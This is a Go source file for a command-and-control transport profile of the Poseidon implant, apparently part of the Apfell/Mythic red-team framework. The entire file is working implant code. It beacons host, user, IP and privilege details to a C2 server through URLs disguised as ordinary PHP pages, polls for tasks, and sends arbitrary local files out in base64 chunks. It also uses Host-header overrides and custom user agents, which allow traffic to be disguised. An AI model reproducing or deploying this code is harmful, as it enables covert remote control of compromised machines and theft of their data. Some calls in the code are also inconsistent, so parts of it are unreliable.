// +build restfulpatchthrough

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

// Static vars for the Restful patchthrough profile
// Confirm that these values match what is in the config.json
// Note: the leading slash should NOT be included

var (
	GetNextTaskURL        = "admin.php?q=CID_REPLACE"
	GetFile               = "download.php?file=FID_REPLACE&ID=CID_REPLACE"
	PostResponse          = "upload.php?page=TID_REPLACE"
	PostNewCallback       = "login"
	PostNewCallbackAESPSK = "register.php?SessionID=UUID_REPLACE"
	PostNewCallbackEKE    = "signup.php?SessionID=UUID_REPLACE"
	PostNewCallbackDHEKE  = "recover_account.php?SessionID=UUID_REPLACE"
)

type C2Patchthrough struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UUID           string
	AesPSK         string
	UserAgent      string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Patchthrough{}
}

func (c C2Patchthrough) Header() string {
	return c.HostHeader
}

func (c *C2Patchthrough) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Patchthrough) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Patchthrough) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Patchthrough) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Patchthrough) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Patchthrough) SleepInterval() int {
	return c.Interval
}

func (c *C2Patchthrough) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Patchthrough) C2Commands() []string {
	return c.Commands
}

func (c *C2Patchthrough) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c *C2Patchthrough) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Patchthrough) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Patchthrough) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Patchthrough) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Patchthrough) ApfID() string {
	return c.ApfellID
}

func (c *C2Patchthrough) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Patchthrough) UniqueID() string {
	return c.UUID
}

func (c *C2Patchthrough) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c C2Patchthrough) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Patchthrough) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Patchthrough) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Patchthrough) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

func (c *C2Patchthrough) CheckIn(ip string, pid int, user string, host string) interface{} {
	var resp []byte

	checkin := structs.CheckInStruct{}
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID
	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	//log.Println("Sending checkin:")
	checkinMsg, _ := json.Marshal(checkin)
	//log.Println(string(checkinMsg))
	// If exchangingKeys == true, then start EKE
	if c.ExchangingKeys {
		//log.Println("Exchanging keys checkin...")
		sID := c.NegotiateKey()

		endpoint := strings.Replace(PostNewCallbackEKE, "UUID_REPLACE", sID, -1)
		resp = c.htmlPostData(endpoint, checkinMsg)

	} else if len(c.AesPSK) != 0 {
		//log.Println("AES PSK checkin...")
		// If we're using a static AES key, then just hit the aes_psk endpoint
		endpoint := strings.Replace(PostNewCallbackAESPSK, "UUID_REPLACE", c.UUID, -1)
		resp = c.htmlPostData(endpoint, checkinMsg)
	} else {
		// If we're not using encryption, we hit the callbacks endpoint directly
		//log.Println("Unencrypted checkin...")
		resp = c.htmlPostData(PostNewCallback, checkinMsg)
	}

	// save the apfell id
	respMsg := structs.CheckinResponse{}
	err := json.Unmarshal(resp, &respMsg)
	if err != nil {
		//log.Printf("Error in unmarshal:\n %s", err.Error())
		//log.Println(respMsg)
		return respMsg
	}

	return respMsg
}

//GetTasking - retrieve new tasks
func (c C2Patchthrough) GetTasking() interface{} {
	endpoint := strings.Replace(GetNextTaskURL, "CID_REPLACE", c.ApfID(), -1)
	//log.Println("Endpoint:", endpoint)
	url := fmt.Sprintf("%s%s", c.URL(), endpoint)
	//log.Println("URL:", url)
	rawTask := c.htmlGetData(url)
	task := structs.Task{}
	err := json.Unmarshal(rawTask, &task)
	if err != nil {
		return structs.Task{Command: "none", Params: "", ID: ""}
	}

	return task
}

//PostResponse - Post task responses
func (c *C2Patchthrough) PostResponse(task structs.Task, output string) []byte {
	strTID := fmt.Sprintf("%s", task.ID)
	endpoint := strings.Replace(PostResponse, "TID_REPLACE", strTID, -1)
	return c.postRESTResponse(endpoint, []byte(output))
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (c *C2Patchthrough) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000 //Normal apfell chunk size
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer

	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//log.Println("Error reading %s: %s", err)
			break
		}

		tResp := structs.TaskResponse{}
		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
		dataToSend, _ := json.Marshal(tResp)
		ret := c.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (c *C2Patchthrough) htmlPostData(urlEnding string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", c.URL(), urlEnding)
	//log.Println("Posting to URL:", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.AesPSK) != 0 {
		sendData = EncryptMessage(sendData)
	}

	contentLength := len(sendData)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	if err != nil {
		//log.Printf("Error creating http POST request: %s", err.Error())
		return make([]byte, 0)
	}

	req.ContentLength = int64(contentLength)
	req.Header.Set("User-Agent", c.GetUserAgent())

	// Set the host header if not empty
	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader
	}

	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		//log.Printf("Error in http POST request: %s", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Printf("Did not receive 200 response code: %d", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//log.Printf("C2Default config in if: %+v\n", c)
		return c.decryptMessage(body)
	}

	return body
}

//htmlGetData - HTTP GET request for data
func (c *C2Patchthrough) htmlGetData(url string) []byte {
	client := &http.Client{}
	var respBody []byte

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//log.Printf("Error completing GET request: %s", err)
		return make([]byte, 0)
	}

	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader
	}

	req.Header.Set("User-Agent", c.GetUserAgent())
	resp, err := client.Do(req)

	if err != nil {
		//log.Printf("Error in request: %s", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Printf("Did not receive 200 response: %d", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	respBody, _ = ioutil.ReadAll(resp.Body)

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		return c.decryptMessage(respBody)
	}

	return respBody

}

//SendFile - download a file
func (c *C2Patchthrough) SendFile(task structs.Task, params string) {
	fileReq := structs.FileRegisterRequest{}
	fileReq.Task = task.ID
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		tMsg := structs.ThreadMsg{}
		tMsg.Error = true
		tMsg.TaskItem = task
		tMsg.TaskResult = []byte(err.Error())
		return
	}

	fi, err := file.Stat()
	if err != nil {
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	file.Read(raw)

	c.SendFileChunks(task, raw)
}

func (c *C2Patchthrough) GetFile(fileid string) []byte {
	strApfellID := fmt.Sprintf("%s", c.ApfID())
	strFID := fmt.Sprintf("%s", fileid)
	url := strings.Replace(GetFile, "CID_REPLACE", strApfellID, -1)
	url = strings.Replace(url, "FID_REPLACE", strFID, -1)
	encfileData := c.htmlGetData(fmt.Sprintf("%s%s", c.URL(), url))

	if len(encfileData) > 0 {
		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
		return rawData
	}

	return make([]byte, 0)
}

//SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
func (c *C2Patchthrough) SendFileChunks(task structs.Task, fileData []byte) {

	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileRegisterRequest{}
	chunkResponse.Chunks = int(chunks)
	chunkResponse.Task = task.ID

	msg, _ := json.Marshal(chunkResponse)
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.FileRegisterResponse{}

	err := json.Unmarshal(resp, &fileResp)

	if err != nil {
		return
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {

		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileChunk{}
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.ChunkNumber = int(i) + 1
		msg.FileID = fileResp.FileID

		encmsg, _ := json.Marshal(msg)
		//resp := c.PostResponse(task, string(encmsg))
		tResp := structs.TaskResponse{}
		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
		dataToSend, _ := json.Marshal(tResp)
		strTID := fmt.Sprintf("%s", task.ID)
		endpoint := strings.Replace(PostResponse, "TID_REPLACE", strTID, -1)
		resp := c.htmlPostData(endpoint, dataToSend)
		//log.Printf("Apfell chunk post response length: %d", len(resp))
		//log.Printf("Apfell chunk post response: %s", string(resp))
		postResp := structs.FileChunkResponse{}
		_ = json.Unmarshal(resp, &postResp)
		if !strings.Contains(postResp.Status, "success") {

			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.htmlPostData(endpoint, encmsg)

		}
		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	resp = c.PostResponse(task, "file downloaded")
}

//NegotiateKey - EKE key negotiation
func (c *C2Patchthrough) NegotiateKey() string {
	sessionID := c.GenerateSessionID()
	//log.Println("Generated sessionID:", sessionID)
	pub, priv := crypto.GenerateRSAKeyPair()
	c.SetRsaKey(priv)
	initMessage := structs.EKEInit{}
	// Assign the session ID and the base64 encoded pub key
	initMessage.SessionID = sessionID
	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	unencryptedMsg, err := json.Marshal(initMessage)

	if err != nil {
		log.Println("error in marshal:", err.Error())
		return ""
	}

	// Send the request to the EKE endpoint
	endpoint := strings.Replace(PostNewCallbackEKE, "UUID_REPLACE", c.UUID, -1)
	//log.Println("In NegotiateKey - posting to endpoint:", endpoint)
	resp := c.htmlPostData(endpoint, unencryptedMsg)
	// Decrypt & Unmarshal the response

	decResp, _ := base64.StdEncoding.DecodeString(string(resp))
	decryptedResponse := crypto.RsaDecryptCipherBytes(decResp, c.RsaKey())
	sessionKeyResp := structs.SessionKeyResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		log.Println("Error in unmarshal: ", err.Error())
		log.Println(string(decryptedResponse))
		return ""
	}

	// Save the new AES session key
	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
	c.SetXKeys(false)
	//log.Println("Returning sessionID:", sessionID)
	return sessionID
}
func (c *C2Patchthrough) EncryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
}

func (c *C2Patchthrough) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.AesPSK)
	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
	return crypto.AesDecrypt(key, decMsg)
}

func (c *C2Patchthrough) GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
	}
	return string(b)
}
